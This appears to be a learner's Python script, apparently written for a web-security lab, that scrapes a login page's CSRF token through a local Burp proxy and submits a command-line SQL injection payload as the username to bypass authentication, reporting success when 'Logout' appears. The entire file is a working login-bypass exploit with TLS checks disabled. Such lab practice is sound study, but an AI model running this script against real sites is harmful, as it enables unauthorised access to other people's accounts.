import requests 
import sys
import urllib3
from bs4 import BeautifulSoup
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'https://127.0.0.1:8080'}

#when get request made passes through proxy 
def get_csrf_token(s, url):
    r = s.get(url, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf = soup.find("input")['value']
    return csrf


#use burpsuit to know request type
#to make login request csrf, username and password
#get token to make login request and checks response
def exploit_sqli(s, url, payload):
    csrf = get_csrf_token(s, url)
    data = {"csrf": csrf,
            "username": payload,
            "password": "anything"}
    
    r = s.post(url, data=data, verify=False, proxies=proxies)
    res = r.text
    if "Logout" in res:
        return True
    else:
        return False

#takes first command line argument  ste its to parameterer url
#then second and sets to aparameter sqli_payload
#makes a session from request libraryp
#and then put into a function 
#if true succesfull if false unsuccesfull
if __name__ == "__main__":
    try:
        url= sys.argv[1].strip()
        sqli_payload = sys.argv[2].strip()
    except IndexError:
        print('[-] Usage %s <url> <sql-payload>' % sys.argv[0])
        print('[-] Example: %s www.example.com "1=1"' % sys.argv[0])


    s = requests.Session()

    if exploit_sqli(s, url, sqli_payload):
        print('[+] SQLi success')
    else:
        print('[-] SQli unseccesful')